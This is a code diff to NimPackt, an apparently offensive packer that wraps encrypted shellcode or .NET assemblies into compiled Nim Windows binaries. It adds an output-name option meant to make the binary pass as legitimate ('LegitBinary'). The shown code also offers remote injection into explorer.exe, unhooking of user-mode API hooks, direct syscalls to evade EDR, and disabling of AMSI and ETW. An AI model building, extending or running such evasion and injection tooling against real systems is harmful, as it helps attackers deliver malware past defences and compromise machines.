@@ -104,12 +104,12 @@ def parseArguments(inArgs):
 
     return result
         
-def generateSource_ExecuteAssembly(fileName, cryptedInput, cryptedCoat, cryptIV, cryptKey, argString):
+def generateSource_ExecuteAssembly(inFileName, outFileName, cryptedInput, cryptedCoat, cryptIV, cryptKey, argString):
     # Construct the Nim source file based on the passed arguments
-    filename = "NimPackt-Template.nim"
+    tplFileName = "NimPackt-Template.nim"
 
     result = ""
-    with open(os.path.join(templateDir, filename),'r') as templateFile:
+    with open(os.path.join(templateDir, tplFileName),'r') as templateFile:
         for line in templateFile:
             new_line = line.rstrip()
             new_line = new_line.replace('#[ PLACEHOLDERCRYPTKEY ]#', cryptKey)
@@ -119,23 +119,26 @@ def generateSource_ExecuteAssembly(fileName, cryptedInput, cryptedCoat, cryptIV,
             new_line = new_line.replace('#[ PLACEHOLDERARGUMENTS ]#', argString)
             result += new_line +"\n"
 
-    outFilename = os.path.join(outDir, os.path.splitext(os.path.basename(fileName))[0].replace('-', '') + "ExecAssemblyNimPackt.nim")
+    if outFileName:
+        outFileName = os.path.join(outDir, outFileName + ".nim")
+    else:
+        outFileName = os.path.join(outDir, os.path.splitext(os.path.basename(inFileName))[0].replace('-', '') + "ExecAssemblyNimPackt.nim")
 
     if not os.path.exists(outDir):
         os.makedirs(outDir)
 
-    with open(outFilename, 'w') as outFile:
+    with open(outFileName, 'w') as outFile:
         outFile.write(result)
         print("Prepared Nim source file.")
 
-    return outFilename
+    return outFileName
 
-def generateSource_Shinject(fileName, cryptedInput, cryptedCoat, cryptIV, cryptKey):
+def generateSource_Shinject(inFileName, outFileName, cryptedInput, cryptedCoat, cryptIV, cryptKey):
     # Construct the Nim source file based on the passed arguments
-    filename = "NimPackt-Template.nim"
+    tplFileName = "NimPackt-Template.nim"
 
     result = ""
-    with open(os.path.join(templateDir, filename),'r') as templateFile:
+    with open(os.path.join(templateDir, tplFileName),'r') as templateFile:
         for line in templateFile:
             new_line = line.rstrip()
             new_line = new_line.replace('#[ PLACEHOLDERCRYPTKEY ]#', cryptKey)
@@ -144,23 +147,26 @@ def generateSource_Shinject(fileName, cryptedInput, cryptedCoat, cryptIV, cryptK
             new_line = new_line.replace('#[ PLACEHOLDERCRYPTIV ]#', cryptIV)
             result += new_line +"\n"
 
-    outFilename = os.path.join(outDir, os.path.splitext(os.path.basename(fileName))[0].replace('-', '') + "ShinjectNimPackt.nim")
+    if outFileName:
+        outFileName = os.path.join(outDir, outFileName + ".nim")
+    else:
+        outFileName = os.path.join(outDir, os.path.splitext(os.path.basename(inFileName))[0].replace('-', '') + "ShinjectNimPackt.nim")
 
     if not os.path.exists(outDir):
         os.makedirs(outDir)
 
-    with open(outFilename, 'w') as outFile:
+    with open(outFileName, 'w') as outFile:
         outFile.write(result)
         print("Prepared Nim source file.")
 
-    return outFilename
+    return outFileName
 
-def generateSource_RemoteShinject(fileName, cryptedInput, cryptedCoat, cryptIV, cryptKey, injecttarget, existingprocess):
+def generateSource_RemoteShinject(inFileName, outFileName, cryptedInput, cryptedCoat, cryptIV, cryptKey, injecttarget, existingprocess):
     # Construct the Nim source file based on the passed arguments
-    filename = "NimPackt-Template.nim"
+    tplFileName = "NimPackt-Template.nim"
 
     result = ""
-    with open(os.path.join(templateDir, filename),'r') as templateFile:
+    with open(os.path.join(templateDir, tplFileName),'r') as templateFile:
         for line in templateFile:
             new_line = line.rstrip()
             new_line = new_line.replace('#[ PLACEHOLDERCRYPTKEY ]#', cryptKey)
@@ -171,16 +177,19 @@ def generateSource_RemoteShinject(fileName, cryptedInput, cryptedCoat, cryptIV, 
             new_line = new_line.replace('#[ PLACEHOLDERNEWPROC ]#', f"var nProc: bool = {str(not existingprocess).lower()}")
             result += new_line +"\n"
 
-    outFilename = os.path.join(outDir, os.path.splitext(os.path.basename(fileName))[0].replace('-', '') + "RemoteShinjectNimPackt.nim")
+    if outFileName:
+        outFileName = os.path.join(outDir, outFileName + ".nim")
+    else:
+        outFileName = os.path.join(outDir, os.path.splitext(os.path.basename(inFileName))[0].replace('-', '') + "RemoteShinjectNimPackt.nim")
 
     if not os.path.exists(outDir):
         os.makedirs(outDir)
 
-    with open(outFilename, 'w') as outFile:
+    with open(outFileName, 'w') as outFile:
         outFile.write(result)
         print("Prepared Nim source file.")
 
-    return outFilename
+    return outFileName
 
 def compileNim(fileName, fileType, executionMode, localInject, hideApp, unhookApis, useSyscalls, sleep, disableAmsi, disableEtw, x64, verbose, debug):
     # Compile the generated Nim file for Windows (cross-compile if run from linux)
@@ -276,6 +285,7 @@ if __name__ == "__main__":
     injection.add_argument('-r', '--remote', action='store_false', dest='localinject', default=True, help='Inject shellcode into remote process (default false)')
     injection.add_argument('-t', '--target', action='store', dest='injecttarget', default="explorer.exe", help='Remote thread targeted for remote process injection (default "explorer.exe", implies -r)')
     injection.add_argument('-E', '--existing', action='store_true', dest='existingprocess', default=False, help='Remote inject into existing process rather than a newly spawned one (default false, implies -r) (WARNING: VOLATILE)')
+    optional.add_argument('-o', '--outfile', action='store', dest='outputfile', help='Filename of the output file (e.g. "LegitBinary"). Specify WITHOUT extension or path. This property will be stored in the output binary as the original filename.')
     optional.add_argument('-nu', '--nounhook', action='store_false', default=True, dest='unhookApis', help='Do NOT unhook user-mode API hooks in the target process by loading a fresh NTDLL.dll')
     optional.add_argument('-ns', '--nosyscalls', action='store_false', default=True, dest='useSyscalls', help='Do NOT use direct syscalls (Windows generation 7-10) instead of high-level APIs to evade EDR')
     optional.add_argument('-f', '--filetype', action='store', default="exe", dest='filetype', help='Filetype to compile ("exe" or "dll", default: "exe")')
@@ -322,13 +332,13 @@ if __name__ == "__main__":
     argString = parseArguments(args.arguments)
 
     if args.executionmode == "execute-assembly":
-        sourceFile = generateSource_ExecuteAssembly(args.inputfile, cryptedInput, cryptedCoat,
+        sourceFile = generateSource_ExecuteAssembly(args.inputfile, args.outputfile, cryptedInput, cryptedCoat,
             cryptIV, cryptKey, argString)
     elif args.executionmode == "shinject" and args.localinject == True:
-        sourceFile = generateSource_Shinject(args.inputfile, cryptedInput, cryptedCoat,
+        sourceFile = generateSource_Shinject(args.inputfile, args.outputfile, cryptedInput, cryptedCoat,
             cryptIV, cryptKey)
     elif args.executionmode == "shinject" and args.localinject == False:
-        sourceFile = generateSource_RemoteShinject(args.inputfile, cryptedInput, cryptedCoat,
+        sourceFile = generateSource_RemoteShinject(args.inputfile, args.outputfile, cryptedInput, cryptedCoat,
             cryptIV, cryptKey, args.injecttarget, args.existingprocess)
     else:
         raise SystemExit("ERROR: Argument 'executionmode' is not valid. Please specify either 'execute-assembly' or 'shinject'.")
